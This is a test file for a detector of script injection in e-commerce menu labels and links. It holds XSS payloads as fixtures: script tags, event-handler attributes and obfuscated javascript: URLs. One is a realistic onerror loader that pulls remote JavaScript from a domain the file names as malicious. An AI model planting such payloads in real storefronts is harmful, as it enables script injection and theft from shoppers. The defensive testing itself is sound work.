/**
 * Menu-label injection detector (gc-7gjj.1, spike §2.4): every rule, the
 * markup a merchant uses on purpose (not flagged), entity-encoded text (not
 * flagged), the stored shape, and the linear-time bound. Pure: no network.
 */
import { describe, it, expect } from "vitest";

import {
  detectMenuInjection,
  isScriptUrl,
  matchMenuItem,
  MAX_MENU_INJECTION_FINDINGS,
  MENU_EXCERPT_MAX,
  menuInjectionDescription,
  menuItemFilename,
  menuItemPath,
  type MenuItemData,
} from "../../app/services/menu-injection-detector.server";

const item = (
  title: string,
  url: string | null = "/collections/all",
  extra: Partial<MenuItemData> = {},
): MenuItemData => ({
  menuId: "100",
  menuTitle: "Main menu",
  itemId: "200",
  parents: [],
  title,
  url,
  ...extra,
});

// The 17TRACK payload shape (October 2026), host from the curated list.
const SEVENTEEN_TRACK =
  "Shop<img src=x onerror=\"s=document.createElement('script');s.src='https://cartassure.top/check-out/assets/l2.js';document.head.appendChild(s)\">";

describe("matchMenuItem: the rules", () => {
  it("flags the 17TRACK onerror loader in a label (handler rule)", () => {
    expect(matchMenuItem(item(SEVENTEEN_TRACK))).toMatchObject({ rule: "handler", field: "title" });
  });

  it.each([
    "<script src=https://example.com/x.js></script>",
    "Sale <SCRIPT>alert(1)</SCRIPT>",
    "<script\n>x</script>",
  ])("flags a script tag in a label: %j", (title) => {
    expect(matchMenuItem(item(title))?.rule).toBe("script");
  });

  it.each([
    '<img src=x onerror="alert(1)">',
    "<svg/onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<a href=/x onclick='go()'>Shop</a>",
    '<div ONMOUSEOVER = "x()">x</div>',
    '<img src="a.png"onerror="x()">',
  ])("flags an on*= handler inside a tag: %j", (title) => {
    expect(matchMenuItem(item(title))?.rule).toBe("handler");
  });

  it.each([
    "<iframe src=https://example.com></iframe>",
    "<object data=x></object>",
    "<embed src=x>",
    '<div srcdoc="&lt;script&gt;">x</div>',
    '<meta http-equiv="refresh" content="0;url=https://example.com">',
  ])("flags a frame, embed or meta refresh: %j", (title) => {
    expect(matchMenuItem(item(title))?.rule).toBe("frame");
  });

  it.each([
    "javascript:alert(1)",
    "  JavaScript:alert(1)",
    "java\tscript:alert(1)",
    "java\u0000script:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html;base64,PHNjcmlwdD4=",
  ])("flags a script URL as the item's link: %j", (url) => {
    expect(matchMenuItem(item("Shop", url))).toMatchObject({ rule: "script_url", field: "url" });
  });

  it.each([
    '<a href="javascript:alert(1)">Shop</a>',
    "<a href=javascript:alert(1)>Shop</a>",
    '<a href="javascript&colon;alert(1)">Shop</a>',
    '<a href="&#106;avascript:alert(1)">Shop</a>',
    "<a href='java&#x09;script:alert(1)'>Shop</a>",
  ])("flags a script URL in an attribute inside a label (references decoded): %j", (title) => {
    expect(matchMenuItem(item(title))).toMatchObject({ rule: "script_url", field: "title" });
  });

  it("flags a listed malicious domain in a label or in the link", () => {
    expect(matchMenuItem(item('<a href="https://www.cartassure.top/x">Shop</a>'))).toMatchObject({
      rule: "domain",
      field: "title",
      domain: "cartassure.top",
    });
    expect(matchMenuItem(item("Shop", "https://cartassure.top/checkout"))).toMatchObject({
      rule: "domain",
      field: "url",
      domain: "cartassure.top",
    });
  });

  it("the most dangerous rule wins when several match", () => {
    expect(matchMenuItem(item("<script>x</script><img onerror=y>"))?.rule).toBe("script");
    expect(matchMenuItem(item("<img src=x onerror=y>", "javascript:x"))?.rule).toBe("handler");
  });
});

describe("matchMenuItem: false positives (precision first)", () => {
  it.each([
    "Shop",
    "Sale <b>50% off</b>",
    '<span class="badge badge--sale">New</span> Arrivals',
    '<img src="https://cdn.shopify.com/s/files/icon.png" alt="">Gifts',
    "Line<br>break",
    "<em>Summer</em> &amp; <strong>Beach</strong>",
    "Learn JavaScript: the basics",
    "Click online for deals",
    "Tom & Jerry <3 cartoons",
    "a < b and c > d",
    "On sale = yes",
    "Contact: info@example.com",
    "",
  ])("never flags plain text or ordinary markup: %j", (title) => {
    expect(matchMenuItem(item(title))).toBeNull();
  });

  it.each([
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&lt;img src=x onerror=alert(1)&gt;",
    "&#60;script&#62;",
  ])("never flags entity-encoded markup (it prints as text): %j", (title) => {
    expect(matchMenuItem(item(title))).toBeNull();
  });

  it.each([
    "/collections/all",
    "https://shop.example.com/pages/about",
    "https://www.instagram.com/shop",
    "mailto:hi@example.com",
    "tel:+15551234",
    "/search?q=javascript:",
    null,
    "",
  ])("never flags an ordinary link: %j", (url) => {
    expect(matchMenuItem(item("Shop", url))).toBeNull();
  });

  it("never flags a lookalike of a listed domain", () => {
    expect(matchMenuItem(item("Shop", "https://notcartassure.top/x"))).toBeNull();
    expect(matchMenuItem(item("Shop", "https://cartassure.top.example.com/x"))).toBeNull();
  });

  it("an attribute value that merely mentions javascript: later in the value is not a script URL", () => {
    expect(matchMenuItem(item('<a href="/learn?topic=javascript:basics">Shop</a>'))).toBeNull();
  });
});

describe("isScriptUrl", () => {
  it("reads the scheme the way a browser does (whitespace and control characters dropped)", () => {
    expect(isScriptUrl(" \n javascript:x")).toBe(true);
    expect(isScriptUrl("JAVASCRIPT:x")).toBe(true);
    expect(isScriptUrl("data:text/html,<b>")).toBe(true);
    expect(isScriptUrl("data:image/png;base64,xx")).toBe(false);
    expect(isScriptUrl("https://x.com/javascript:")).toBe(false);
    expect(isScriptUrl("")).toBe(false);
  });
});

describe("detectMenuInjection: stored shape", () => {
  it("emits one HIGH MENU_INJECTION finding per matching item, with a fixed shape", () => {
    const findings = detectMenuInjection([
      item("Shop"),
      item(SEVENTEEN_TRACK, "/collections/all", {
        itemId: "201",
        parents: ["Catalog"],
      }),
    ]);
    expect(findings).toHaveLength(1);
    const [f] = findings;
    expect(f).toMatchObject({
      filename: "menus/100/items/201",
      lineNumber: 0,
      findingType: "MENU_INJECTION",
      severity: "HIGH",
    });
    const [path, seen] = f.codeSnippet.split("\n");
    // Each title is cut to 80 characters (77 + "...").
    expect(path).toBe(`Main menu > Catalog > ${SEVENTEEN_TRACK.slice(0, 77)}...`);
    expect(seen.startsWith("Label: ")).toBe(true);
    expect(seen).toContain("onerror");
    expect(f.description).toBe(menuInjectionDescription({ rule: "handler", field: "title" }));
  });

  it("names the link when the URL matched", () => {
    const [f] = detectMenuInjection([item("Shop", "javascript:steal()")]);
    expect(f.codeSnippet.split("\n")[1]).toBe("Link: javascript:steal()");
    expect(f.description).toMatch(/^A menu item's link contains a link that runs code/);
  });

  it("names the listed domain from the curated list, never page text", () => {
    const [f] = detectMenuInjection([item("Shop", "https://cartassure.top/x")]);
    expect(f.description).toContain("a link to cartassure.top, a known malicious domain");
  });

  it("bounds the excerpt and every title in the path", () => {
    const long = `${"A".repeat(5_000)}<img src=x onerror=x()>${"B".repeat(5_000)}`;
    const [f] = detectMenuInjection([
      item(long, "/x", { menuTitle: "M".repeat(500), parents: ["P".repeat(500)] }),
    ]);
    const [path, seen] = f.codeSnippet.split("\n");
    expect(seen.length).toBeLessThanOrEqual("Label: ".length + MENU_EXCERPT_MAX);
    expect(seen).toContain("onerror");
    for (const part of path.split(" > ")) expect(part.length).toBeLessThanOrEqual(80);
  });

  it("collapses line breaks so the stored snippet stays two lines", () => {
    const [f] = detectMenuInjection([
      item("Shop\n<img src=x\nonerror=x()>", "/x", { menuTitle: "Main\nmenu" }),
    ]);
    expect(f.codeSnippet.split("\n")).toHaveLength(2);
  });

  it("an untitled menu or item still has a readable path", () => {
    expect(menuItemPath({ menuTitle: "", parents: [""], title: "" })).toBe(
      "(untitled) > (untitled) > (untitled)",
    );
  });

  it("the locator is the numeric ids", () => {
    expect(menuItemFilename({ menuId: "1", itemId: "2" })).toBe("menus/1/items/2");
  });

  it("caps the number of findings for a flood", () => {
    const items = Array.from({ length: MAX_MENU_INJECTION_FINDINGS + 30 }, (_, i) =>
      item("<script>x</script>", "/x", { itemId: String(i) }),
    );
    expect(detectMenuInjection(items)).toHaveLength(MAX_MENU_INJECTION_FINDINGS);
  });

  it("empty input yields nothing", () => {
    expect(detectMenuInjection([])).toEqual([]);
  });

  it("merchant copy: no em or en dashes, no product-name misspelling", () => {
    for (const rule of ["script", "handler", "frame", "script_url", "domain"] as const) {
      for (const field of ["title", "url"] as const) {
        const text = menuInjectionDescription({ rule, field, domain: "cartassure.top" });
        expect(text).not.toMatch(/[—–]/);
        expect(text).not.toMatch(/ghost code/i);
      }
    }
  });
});

describe("detectMenuInjection: linear time", () => {
  it.each([
    ["1 MB of tag starts with no closing >", "<a x ".repeat(200_000)],
    ["1 MB of one tag full of near-handlers", `<a ${"on ".repeat(330_000)}>`],
    ["1 MB of attributes with near-script values", `<a ${"href=javas ".repeat(90_000)}>`],
    ["1 MB of meta tags without http-equiv", "<meta a>".repeat(125_000)],
    ["1 MB of text", "x".repeat(1_000_000)],
    ["1 MB of character references", "&#106;".repeat(170_000)],
  ])("%s stays fast", (_label, title) => {
    const started = Date.now();
    detectMenuInjection([item(title, title)]);
    expect(Date.now() - started).toBeLessThan(2_000);
  });
});
